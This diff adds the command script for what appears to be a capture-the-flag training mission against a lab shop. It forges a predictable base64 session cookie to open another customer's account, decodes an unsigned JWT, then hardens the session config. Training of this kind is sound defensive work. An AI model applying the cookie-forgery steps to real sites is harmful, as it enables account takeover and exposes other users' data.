@@ -1,0 +1,16 @@
+# Season 3, mission 4: the customer next door
+cat mandate/PL-2027-002.txt
+curl -b "session=dXNlcjoxMDQy" https://shop.pelican.test/account
+echo dXNlcjoxMDQy | base64 -d
+echo -n user:1041 | base64
+curl -b "session=dXNlcjoxMDQx" https://shop.pelican.test/account
+submit FLAG{pelican-next-session-2f8c}
+jwt decode eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMDQyIiwibmFtZSI6Imtlc3RyZWwtdGVzdCIsInJvbGUiOiJjdXN0b21lciIsImlhdCI6MTgwNzAwMDAwMH0.
+answer unsigned
+curl https://shop.pelican.test/account/address
+answer origin
+sed -i "s/session_id: counter/session_id: random/" dossier/session.yml
+sed -i "s/api_token_alg: none/api_token_alg: hs256/" dossier/session.yml
+sed -i "s/csrf_token: off/csrf_token: on/" dossier/session.yml
+sed -i "s/session_cookie_samesite: none/session_cookie_samesite: lax/" dossier/session.yml
+verify
